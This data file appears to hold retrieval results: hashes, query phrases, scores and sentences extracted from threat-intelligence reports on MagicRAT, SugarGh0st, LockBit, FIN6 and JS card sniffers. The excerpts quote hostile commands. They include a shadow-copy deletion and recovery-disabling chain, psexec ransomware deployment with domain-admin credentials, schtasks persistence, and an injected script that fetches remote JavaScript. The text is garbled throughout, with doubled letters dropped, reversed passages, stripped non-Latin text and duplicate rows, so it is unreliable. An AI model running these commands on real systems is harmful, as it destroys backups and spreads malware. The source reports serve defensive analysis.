c91a9ca760ed281ab3a6e831ccac7850,wmic,0.7848694123347798,"['61 MS14-058 Exploit .', '45 WinRM .', '18 MS14-068 Exploit .', '49 WinRS .', '20 MS15-078 Exploit .', '46 wmic .', '13 wmiexec.vbs .', '15 7 JPCERT/C 78']"
31347d89b18461f35448b26fefb00133,cmd.exe /c start,0.7861735725500969,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
6676698d65e372feb79c0159d9d2b11e,cmd.exe /c start,0.7861735725500969,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
08a0ccc49008dbbf532b22d39ac2b886,delete the driver files.,0.7719300643534468,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
3e9312913ace03550c810e6b92ab1d61,whoami /groups,0.8671286062716087,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami /groups,0.8671286062716087,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
d62a6e941ec0167b0f3e15c72eb634ba,the configuration file encrypted.,0.8266329492308891,"['It writes itself in files: and modifies the %system32%\\wbem\\wmiqry32.dl, %system32%\\wbem\\wmihlp32.dl system registry to be loaded instead of file.', '%system32%\\wbem\\wbemsvc.dl To achieve this, it writes the folowing registry value: [HKCR\\CLSID\\{7C857801-7381-1CF-84D-0A04B2E24}\\InProcServer32] Default = %system32%\\wbem\\wmihlp32.dl Operation The module is automaticaly loaded into proceses that use wbemsvc.dl.', 'When loaded in svchost.exe that was started with -k netsvc parameter, it starts its main thread.', 'The module creates ShelHWStop, Global\\ShelHWDetectionEvent events, mutex ShelHWDetectionMutex.', '12 The main thread exits if the folowing proceses were found at its start: LMon.exe sagui.exe RDTask.exe kpf4gui.exe ALsvc.exe pxagent.exe fsma32.exe licwiz.exe SavService.exe prevxcsi.exe alertwal.exe livehelp.exe SAVAdminService.exe csi-eui.exe mpf.exe lokout.exe savprogres.exe lpfw.exe mpfcm.exe emlproui.exe savmain.exe outpost.exe fameh32.exe emlproxy.exe savcleanup.exe filemon.exe AntiHok.exe endtaskpro.exe savcli.exe procmon.exe xfilter.exe netguardlite.exe backgroundscanclient.exe Snifer.exe scfservice.exe oasclnt.exe sdcservice.exe acs.exe scfmanager.exe omnitray.exe sdcdevconx.exe aupdrun.exe spywareterminatorshield.exe onlinent.exe sdcdevconIA.exe spfw.exe spywat~1.exe opf.exe sdcdevcon.exe spfirewalsvc.exe supdate.exe pctavsvc.exe configuresav.exe fwsrv.exe terminet.exe pctav.exe alupdate.exe opfsvc.exe tscutynt.exe pcviper.exe InstLsp.exe uwcdsvr.exe umxtray.exe persfw.exe CMain.exe dfw.exe updclient.exe pgacount.exe CavAUD.exe ipatrol.exe webwal.exe privatefirewal3.exe CavEmSrv.exe pciprev.exe winroute.exe protect.exe Cavmr.exe prifw.exe apvxdwin.exe rt_crc_service.exe Cavl.exe tzpfw.exe as3pf.exe schedulerdaemon.exe CavAp.exe privatefirewal3.exe avas.exe sdtrayap.exe CavCons.exe pft.exe avcom.exe siteadv.exe CavMud.exe armorwal.exe avkproxy.exe sndsrvc.exe CavUMAS.exe ap_firewal.exe avkservice.exe snsmcon.exe Upd.exe blackd.exe avktray.exe snsupd.exe cavasm.exe blackice.exe avkwctrl.exe procguard.exe CavSub.exe umxagent.exe avmgma.exe DCSUserProt.exe CavUserUpd.exe kpf4s.exe avtask.exe avkwctl.exe CavQ.exe tpfdmn.exe aws.exe firewal.exe Cavoar.exe blinksvc.exe bgctl.exe THGuard.exe CEmRep.exe sp_rser.exe bgnt.exe spybotsd.exe OnAcesInstaler.exe op_mon.exe botsafe.exe xauth_service.exe SoftAct.exe cmdagent.exe bulguard.exe xfilter.exe CavSn.exe VCATCH.EXE cdas2.exe zlh.exe Packetizer.exe SpyHunter3.exe cmgrdian.exe adoronsfirewal.exe Packetyzer.exe washer.exe configmgr.exe scfservice.exe zanda.exe authfw.exe cpd.exe scfmanager.exe zerospywarele.exe dvpapi.exe espwatch.exe dltray.exe 13 zerospywarelite_instaler.exe clamd.exe fgui.exe dlservice.exe Wireshark.exe sab_wab.exe filedeleter.exe ashwebsv.exe tshark.exe SUPERAntiSpyware.exe firewal.exe ashdisp.exe rawshark.exe vdtask.exe firewal204.exe ashmaisv.exe Ethereal.exe asr.exe firewalgui.exe ashserv.exe Tethereal.exe NetguardLite.exe gateway.exe aswupdsv.exe Windump.exe nstzerospywarelite.exe hpf_.exe avastui.exe Tcpdump.exe cdinstx.exe iface.exe avastsvc.exe Netcap.exe cdas17.exe invent.exe Netmon.exe fsrt.exe ipcserver.exe CV.exe VSDesktop.exe ipctray.exe The module reads the registry value SOFTWARE\\Microsoft\\Windows\\CurentVersion\\Reliability TimeStampForUI.', 'It is an encrypted configuration file.', 'The configuration file contains the list of aditional modules, their names, DL exports names to cal and location of the modules aditional files.', 'Gaus ShelNotifyUser ShelNotifyUserEx SetWindowEvent InitShelEx %systemrot%\\system32\\winshel.ocx %temp%\\ws1bin.dat Godel InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\dskapi.ocx %temp%\\~gdl.tmp UsbDir InitCache RevertCache ValidateEntry CreateEntry %windir%\\system32\\smdk.ocx %temp%\\~mdk.tmp String values from config file (example) 14 Every module is loaded and its export functions are caled as specified in the configuration.', 'Most of the actions are loged in an encrypted (with XOR) file %temp%\\~shw.tmp.', 'Sample of decrypted ~shw.tmp After loading aditional modules, it tries to acquire the same privileges as explorer.exe and then starts its C&C interaction lop.', 'Prior to comunicating with the C&C, al the information from the other modules log files is copied to the ~shw.tmp file.']"
39e29af445d8deae622f11c7366518a7,The batch script,0.8423512966646981,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16 The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
eca348ac2e9d0da5334464f9c73d2754,The batch script,0.8423512966646981,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 5/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 6/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
d3d11f0faf194266cc86ec9f1af4162d,with batch scripts,0.7586541997864189,"['In 2019 we saw several cases in which threat actors that historicaly targeted sensitive information such as personaly identifiable information (PI) and credit card information turned to ransomware to monetize aces to victim networks.', 'FIN6 In one case, FIN6, a cyber crime group known to target payment card information, was identified operating inside a company in the enginering sector.', 'The presence of FIN6 in an enginering company with no conection to payment card information semed od.', 'The Mandiant investigation revealed that the atacker was in the early stages of a deploying LockerGoga.', 'Using domain administrator credentials, the atacker ran batch files containing psexec comands to conect to remote systems and deploy LockerGoga.', 'The batch scripts (Fig.', '1) executed LockerGoga as the service mstdc, which was likely the atackers atempt to masquerade as the legitimate Windows service msdtc.', 'The batch files used by Figure 1. the atacker folowed the naming convention xa.bat, xab.bat, xac.bat and Strings from so on.', 'deployment BAT files.', 'start copy svchost.exe \\10.1.1.1\\c$\\windows\\temp\\start psexec.exe \\10.1.1.1 -u domain\\domainadmin -p pasword -d -h -r mstdc -s -acepteula -nobaner c:\\windows\\temp\\svchost.exe Mandiant analysts linked the tols and atacker infrastructure to other FIN6 activity, and eventualy concluded that FIN6 had expanded to using ransomware to further monetize their aces to compromised environments.', 'UNC173 In 2019, UNC173 targeted a retailer and tried to obtain payment card information from the point-of-sale (POS) environment.']"
399c17d5f44d8b855c9751aae73f3c11,Uses GetComputerName to query the computer name.,0.7718691072807002,"[']com:80 Cache-Control: no-cache Example 4 The Cobalt Strike implant comunicates with a C2 server over the HTP protocol: ""hxp:/23.24.91[.', ']98/owa/?path=/calendar&wa=fa5fQcmE_ qaSqyCFDP6zxAonSbVYV5Zh3velwTIWCJa0F9_nQiAuFdheT70rmBUBq7mnY0b7yR8FnhjNF19EBc7u_ bvm8uTCEx6rG9kyxOUcFlgjMUzur2tQJ-NmPlFB97t3LPsXdYkbaBiKBdFtbkAXeW9xRdwFuT29Fpays"" ""hxp:/47.96.167[.', ']205:808/owa/?path=/calendar&wa=e89wNPykFLPfHbYB7EZQBa3r5iNVI1xVTGsRd NyDpGe63-4pAmE9ZLjU8ImCUKG8L_JvKk9yN2MsD78LpRmOazvojXhUow8zQoBVqn-kV-HC-VqmI_2 BTCqlQHjOBpyMBJyQ3SmBin6xfNZsUkH7_H_Sa79SEA74gG0PGzk8"" Example 5 A file (MD5: 4e43c0ca1febc1c7107a8eb5325b9) that was found during an incident investigation uses HTPS to interact with its C2.', 'Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Comand and Control TA01 | Aplication Layer Protocol: Web Protocols T1071.01 Contents 267 Comand name Comand description ls Get a list of objects in the specified directory.', 'execute Run an arbitrary file or comand.', ""getcomputername Get the computer's name."", 'Download a file to an infected system and save it with the specified name.', 'Information about the download result is forwarded to the server at miror-exchange[.', ']com/upload/ upload with the system ID (GET parameter ""id""), file name and eror code (GET parameter ""file"") specified.', 'exit Terminate the backdor.', 'Detection Al of the analyzed examples atempt to lok legitimate, which makes detection of the Aplication Layer Protocol: Web Protocols T1071.01 technique more dificult.']"
eedc908904741699e76852465550c3cd,brute-force activity,0.9010114864093721,"['The script, which is loaded by many sites, JS snifers can be instaled by obtaining would load a bank card JS snifer along aces to a websites administrator panel with itself.', 'with permision to edit files.', 'The login and pasword can be compromised through This type of malware delivery can result several methods: in rival snifer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, paswords saved in browsers; the operators of the WebRank snifer gained aces to the MagentoName malware for intercepting entered data JS snifer code and aded their malicious (including logins and paswords); code to it.', 'brute force.', 'Another example is the atack on Fedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS snifer code into A snifer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automaticaly uploaded the scripts work on the target website: JS snifer to al Fedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer fedbackembad-min-1.0.js script.', 'The suport chats or analytics and snifer was injected into the Fedify statistics systems).', 'By injecting code on August 17, and was detected malicious code into the service and removed on September 1.', 'However, script code, a JS snifer infiltrates the intruders infected the website again the code of online store websites.']"
8d2f7e9f01ec7f234b9e60df5ad44fec,brute-force activity,0.9010114864093721,"['The script, which is loaded by many sites, JS snifers can be instaled by obtaining would load a bank card JS snifer along aces to a websites administrator panel with itself.', 'with permision to edit files.', 'The login and pasword can be compromised through This type of malware delivery can result several methods: in rival snifer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, paswords saved in browsers; the operators of the WebRank snifer gained aces to the MagentoName malware for intercepting entered data JS snifer code and aded their malicious (including logins and paswords); code to it.', 'brute force.', 'Another example is the atack on Fedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS snifer code into A snifer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automaticaly uploaded the scripts work on the target website: JS snifer to al Fedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer fedbackembad-min-1.0.js script.', 'The suport chats or analytics and snifer was injected into the Fedify statistics systems).', 'By injecting code on August 17, and was detected malicious code into the service and removed on September 1.', 'However, script code, a JS snifer infiltrates the intruders infected the website again the code of online store websites.']"
3d2e99ba94188b71a17364073a49e3ea,the batch file,0.7514180536353627,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
3d2e99ba94188b71a17364073a49e3ea,The batch file,0.7514180536353627,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
39e29af445d8deae622f11c7366518a7,The batch script,0.8423512966646981,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', '5/16 The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
eca348ac2e9d0da5334464f9c73d2754,The batch script,0.8423512966646981,"['After that, the droped JavaScript is executed using the living-of-the-land binary (LoLBin) cscript.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 5/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea Sample of malicious LNK file.', 'JavaScript droper The JavaScript droper is a heavily obfuscated script embeded with base64 encoded data of the other components of the atack.', 'The JavaScript decodes and drops the embeded files into the %TEMP% folder, including a batch script, a customized DL loader, an encrypted SugarGh0st payload, and a decoy document.', 'It first opens the decoy document to masquerade as legitimate action, then copies the legitimate rundl32 executable from the Windows\\SysWow64 folder into the %TEMP% folder.', 'Finaly, it executes the batch script loader from the %TEMP% location and runs the customized DL loader.', 'The JavaScript deleted itself from the file system afterward.', 'htps:/blog.talosinteligence.com/new-sugargh0st-rat/ 6/19 1/16/24, 12:16 PM New SugarGh0st RAT targets Uzbekistan government and South Korea The JavaScript droper.', 'Batch script loader The batch script, in this instance, is named ctfmon.bat and has the comands to run the droped customized DL loader.', 'When executed, it sideloads the DL loader with rundl32.exe and executes the function which is DlUnregisterServer, typicaly used by COM (Component Object Model) DLs.', 'The batch script loader.']"
31347d89b18461f35448b26fefb00133,cmd /C,0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,cmd /C,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,cmd /C,0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
31347d89b18461f35448b26fefb00133,cmd /c,0.8135172745614935,"['These SQL queries are based on MITREs recomended analytics, and are meant to further asist the SOC analyst in their threat hunt for a potential breach on their network.', '15 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe caled from Comand Shel Tactic: TP MITRE Reference: CAR-2013-03-01: Reg.exe caled from Comand Shel Hypothesis: Registry modifications are often esential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphicaly via select source.name, data.proces.cmd, count(*) AS regedit.exe or by using the coresponding chanels, or even hostcount from network-events where type = 'sysmon' caling the Registry APIs directly."", ""The built-in utility reg.exe AND data.proces.action = 'launch' AND data.proces."", ""provides a comand-line interface to the registry, so that image.file = 'reg.exe' AND data.proces.parentImage.file = queries and modifications can be performed from a shel, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe wil likely be explorer.exe.', ""Ocasionaly, (data.proces.cmd LIKE '%ad%' OR data.proces.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.proces.cmd LIKE '%copy%' OR data."", 'behavior as wel, but likely from a diferent proces tre.', ""proces.cmd LIKE '%restore%' OR data.proces.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.proces.cmd LIKE '%import%') order by tuned out acordingly."", 'hostcount DESC 16 KCATA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
d5019121cbc645eb0787efab173a12b3,cmd /c,1.0,"['- - .', 'Hi-Tech Crime Trends , - , .', 'Hi-Tech Crime Trends -, - , SOC-, , .', 'Hi-Tech Crime Trends - , , .', 'Group-IB , , - - .', '.', 'Group-IB: , , Leaks , , , , , Group-IB , , , , , GROUP-IB.RU 6 Group-IB Hi-Tech Crime Trends, .', ': Group-IB Threat Inteligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB , , - .', ', Group-IB , .', ', - - .']"
6676698d65e372feb79c0159d9d2b11e,cmd /c,0.8135172745614935,"[', , APT28.', ', , - .', ', - .', ', .', ': OCEANMAP - , C#.', 'cmd.exe.', 'IMAP.', ', base64- , (""Drafts"") ; , \' .', '(""INBOX"").', '( , ), .', "".URL- 'VMSearch.url' .""]"
18c26951bd00fb6e41199b99210fa0f8,ARP table,0.7929878754892529,"['In their atack campaign, the droper first deletes the file path of ApcHelper.sys through cmd.exe to ad its malicious driver to the same path in the next steps: cmd.exe /c del /f /a /q %SYSTEMROT%\\system\\ApcHelper.sys Next, it creates a new service for the kernel driver: sc create ApcHelper binPath= %SYSTEMROT%\\system\\ApcHelper.sys type=kernel Finaly, the droper instals a kernel driver and uses it to stop the proceses of various security products, including Sophos, ALsvc, HMPAlert, McsAgent, SAVAdminService, SapApi, SavService, SEDService, and SPService.', 'cmd.exe /c copy ApcHelper.sys %SYSTEMROT%\\system\\ApcHelper.sys /Y 24 2.', 'Inhibiting System Recovery (T1490) Acording to a CISA flash report on Lockbit 2.0 malware published in February 202, threat actors executed the folowing Windows Comand Shel script to damage the built-in recovery [17]: cmd.exe ""C:\\Windows\\System32\\cmd.exe"" /c vsadmin delete shadows /al /quiet & wmic shadowcopy delete & bcdedit /set {default} botstatuspolicy ignorealfailures & bcdedit /set {default} recoveryenabled no In this code, adversaries leveraged the vsadmin and wmic utilities to quietly delete al shadow copies on the compromised system, supresing any confirmation prompts or output.', 'Folowing this, atackers used the bcdedit utility to modify the bot configuration data on the system, which is believed to be done to ignore al bot erors and continue boting.', 'Note that the recoveryenabled option is suplied to the bcdedit to disable recovery options for the default bot entry.', '3.', 'Discovering Domain Acounts (T1087.02) Another CISA report in February 202 reveals that MudyWater leveraged the folowing comand to enumerate domain users [18]: cmd.exe net user/domain 25 #1.4.', 'T1059.04 Unix Shel The Unix shel is a comand-line interface that alows users to interact with Unix-like operating systems.', 'It includes several diferent shels, such as the Bourne Shel (sh), Bourne-Again Shel (bash), Z Shel (zsh), Korn Shel (ksh), and Secure Shel (SH), which are comonly used.', 'The shel provides a variety of comands and features that make it easy to manage files and run programs on the system.', 'In adition to providing an interactive comand-line interface (CLI), the Unix shel also includes a scripting language that alows users to write shel scripts.']"
18c26951bd00fb6e41199b99210fa0f8,ARP table,0.7949311938792307,"['If the browser version contains a vulnerability, coresponding exploitation code gets run on the target system, potentialy giving the atacker a remote code execution ability.', 'For these types of atacks, adversaries often leverage JavaScript.', 'For instance, acording to a malware analysis report performed by Palo Alto, analyzing threat samples from April 202 to June 202, among al of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 30 diferent domains [31].', 'Analysis shows that atackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.apendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'htps:/train.developfirstline.com/delivery.js?s=3\' elem.apendAfter(document.getElementsByTagName(\'script\')(0]) elem.apendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.apendChild(elem) .', '.', '.', '37 #1.8.']"
7856ebf4259ae125d28e1268047ceb06,the encrypted data,0.8529851505836112,"['In modern cybersecurity aproaches, authorization could also incorporate other risk factors such as behavioral analytics and evaluation of threat inteligence.', 'Microsoft Digital Defense Report | September 2020 83 TABLE OF CONTENTS INTRODUCTION THE STATE OF CYBERCRIME NATION STATE THREATS SECURITY AND THE REMOTE WORKFORCE ACTIONABLE LEARNINGS GLOSARY breach ciphertext data estate encryption Any incident that results in unauthorized aces of Data or information in its encrypted form used The procedures, services, and infrastructure used to The proces of transforming plaintext into data, aplications, services, networks, and/or devices primarily by cryptology experts.', 'Sometimes refered manage corporate data in the digital estate.', 'ciphertext.', 'by bypasing their underlying security mechanisms.', 'to as encrypted data.', 'A security breach ocurs when an individual or data los prevention (DLP) event an aplication ilegitimately enters a private, cloud aces security broker (CASB) A set of procedures and mechanisms to stop An observable ocurence in an information system confidential, or unauthorized logical IT perimeter.', 'A CASB is a software tol or service that sensitive data from leaving a security boundary.', 'or network.', 'sits betwen an organizations on-premises brownfield infrastructure and a cloud providers infrastructure.', 'denial of service exfiltration Existing deployed IoT/IoT devices that might not They might also provide other services such as An atack that prevents or impairs the authorized The unauthorized transfer of information from an have modern hardware or functionality.']"
c5015c07f1dfdf29e9638da275dcaf47,using the API,0.7905058782555826,"['ESET Research Whitepapers / August 2018 TURL A OUTLOK BACKDOR Analysis of an unusual Turla backdor 2 Turla Outlok Backdor / Analysis of an unusual Turla backdor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']"
c5015c07f1dfdf29e9638da275dcaf47,using the API,0.7905058782555826,"['ESET Research Whitepapers / August 2018 TURL A OUTLOK BACKDOR Analysis of an unusual Turla backdor 2 Turla Outlok Backdor / Analysis of an unusual Turla backdor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']"
